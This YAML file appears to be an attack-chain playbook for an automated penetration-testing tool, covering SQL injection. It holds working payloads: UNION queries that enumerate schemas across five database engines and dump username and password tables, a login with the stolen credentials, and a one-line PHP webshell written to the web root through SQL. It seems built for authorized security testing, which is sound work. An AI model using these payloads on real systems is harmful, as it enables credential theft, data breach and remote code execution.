id: sqli-chains
category: attack_chains
name: SQL Injection Attack Chains

chains:
  sqli_to_credential_dump:
    name: "SQLi -> Credential Dump -> Account Takeover"
    description: "Leverage SQL injection to extract user credentials, then authenticate as admin"
    severity: critical
    prerequisites:
      - "Confirmed SQL injection (error-based, union-based, or blind)"
    steps:
      - step: 1
        action: "Determine column count"
        technique: "ORDER BY N-- (increment until error)"
        tool: "http_request"
      - step: 2
        action: "Find string-output column"
        technique: "UNION SELECT NULL,'secmcp_marker',NULL,...--"
        tool: "http_request"
      - step: 3
        action: "Extract database schema"
        techniques:
          sqlite: "UNION SELECT sql FROM sqlite_master WHERE type='table'--"
          mysql: "UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--"
          postgresql: "UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public'--"
          mssql: "UNION SELECT name FROM sysobjects WHERE xtype='U'--"
          oracle: "UNION SELECT table_name FROM user_tables--"
        tool: "http_request"
      - step: 4
        action: "Extract credentials"
        technique: "UNION SELECT username,password FROM <discovered_user_table>--"
        tool: "http_request"
      - step: 5
        action: "Authenticate with extracted credentials"
        technique: "POST to login endpoint with dumped username/password"
        tool: "http_request"
      - step: 6
        action: "Run post-auth testing"
        technique: "Use plan_next with auth-obtained signals and the captured token/session context"
        tool: "plan_next"
    impact: "Full database compromise, account takeover, privilege escalation"
    cwe_chain: ["CWE-89", "CWE-522", "CWE-284"]

  sqli_to_rce:
    name: "SQLi -> File Write -> Remote Code Execution"
    description: "Use SQL injection to write a webshell to the filesystem"
    severity: critical
    prerequisites:
      - "Confirmed SQL injection with write privileges"
      - "Known web root path"
    steps:
      - step: 1
        action: "Determine database type and privileges"
        techniques:
          mysql: "UNION SELECT user(),@@datadir--"
          postgresql: "UNION SELECT current_user,pg_read_file('/etc/hostname')--"
        tool: "http_request"
      - step: 2
        action: "Write webshell via SQL"
        techniques:
          mysql: "INTO OUTFILE '/var/www/html/shell.php' -- (requires FILE privilege)"
          postgresql: "COPY (SELECT '<?php system($_GET[c]); ?>') TO '/var/www/html/shell.php'"
          mssql: "xp_cmdshell 'echo ^<?php system($_GET[c]); ?^> > C:\\inetpub\\wwwroot\\shell.php'"
        tool: "http_request"
      - step: 3
        action: "Verify webshell execution"
        technique: "GET /shell.php?c=id"
        tool: "http_request"
    impact: "Remote code execution on the database/web server"
    cwe_chain: ["CWE-89", "CWE-434", "CWE-94"]

  sqli_to_data_exfil:
    name: "SQLi -> Schema Enumeration -> Sensitive Data Extraction"
    description: "Systematically extract all sensitive data via SQL injection"
    severity: critical
    prerequisites:
      - "Confirmed UNION-based or blind SQL injection"
    steps:
      - step: 1
        action: "Enumerate all tables"
        tool: "http_request"
      - step: 2
        action: "Identify high-value tables"
        targets:
          - "User/account tables (passwords, emails, PII)"
          - "Payment/card tables (PCI-critical data)"
          - "Session/token tables (active sessions)"
          - "Configuration tables (API keys, secrets)"
          - "Audit/log tables (evidence of other attacks)"
      - step: 3
        action: "Extract and report each category as separate finding"
        tool: "save_finding"
    impact: "Complete data breach including PII, credentials, payment data"
    cwe_chain: ["CWE-89", "CWE-200", "CWE-311"]
